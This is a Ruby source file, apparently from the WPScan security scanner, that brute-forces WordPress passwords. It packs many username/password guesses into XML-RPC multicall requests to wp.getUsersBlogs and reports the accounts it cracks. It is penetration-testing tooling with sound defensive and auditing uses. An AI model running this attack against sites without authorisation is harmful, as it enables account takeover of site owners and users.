# frozen_string_literal: true

module WPScan
  module Finders
    module Passwords
      # Password attack against the XMLRPC interface with the multicall method
      # WP < 4.4 is vulnerable to such attack
      class XMLRPCMulticall < CMSScanner::Finders::Finder
        # @param [ Array<User> ] users
        # @param [ Array<String> ] passwords
        #
        # @return [ Typhoeus::Response ]
        def do_multi_call(users, passwords)
          methods = []

          users.each do |user|
            passwords.each do |password|
              methods << ['wp.getUsersBlogs', user.username, password]
            end
          end

          target.multi_call(methods, cache_ttl: 0).run
        end

        # @param [ Array<Model::User> ] users
        # @param [ Array<String> ] passwords
        # @param [ Hash ] opts
        # @option opts [ Boolean ] :show_progression
        # @option opts [ Integer ] :multicall_max_passwords
        #
        # @yield [ Model::User ] When a valid combination is found
        #
        # TODO: Make rubocop happy about metrics etc
        #
        # rubocop:disable all
        def attack(users, passwords, opts = {})
          wordlist_index         = 0
          max_passwords          = opts[:multicall_max_passwords]
          current_passwords_size = passwords_size(max_passwords, users.size)

          create_progress_bar(total: (passwords.size / current_passwords_size.round(1)).ceil,
                              show_progression: opts[:show_progression])

          loop do
            current_users     = users.select { |user| user.password.nil? }
            current_passwords = passwords[wordlist_index, current_passwords_size]
            wordlist_index   += current_passwords_size

            break if current_users.empty? || current_passwords.nil? || current_passwords.empty?

            res = do_multi_call(current_users, current_passwords)

            progress_bar.increment

            check_and_output_errors(res)

            # Avoid to parse the response and iterate over all the structs in the document
            # if there isn't any tag matching a valid combination
            next unless res.body =~ /isAdmin/ # maybe a better one ?

            Nokogiri::XML(res.body).xpath('//struct').each_with_index do |struct, index|
              next if struct.text =~ /faultCode/

              user = current_users[index / current_passwords.size]
              user.password = current_passwords[index % current_passwords.size]

              yield user

              # Updates the current_passwords_size and progress_bar#total
              # given that less requests will be done due to a valid combination found.
              current_passwords_size = passwords_size(max_passwords, current_users.size - 1)

              if current_passwords_size == 0
                progress_bar.log('All Found') # remove ?
                progress_bar.stop
                break
              end
              
              begin
                progress_bar.total = progress_bar.progress + ((passwords.size - wordlist_index) / current_passwords_size.round(1)).ceil
              rescue ProgressBar::InvalidProgressError
              end
            end
          end
          # Maybe a progress_bar.stop ?
        end
        # rubocop:enable all

        def passwords_size(max_passwords, users_size)
          return 1 if max_passwords < users_size
          return 0 if users_size.zero?

          max_passwords / users_size
        end

        # @param [ Typhoeus::Response ] res
        def check_and_output_errors(res)
          progress_bar.log("Incorrect response: #{res.code} / #{res.return_message}") unless res.code == 200

          if /parse error. not well formed/i.match?(res.body)
            progress_bar.log('Parsing error, might be caused by a too high --max-passwords value (such as >= 2k)')
          end

          return unless /requested method [^ ]+ does not exist/i.match?(res.body)

          progress_bar.log('The requested method is not supported')
        end
      end
    end
  end
end
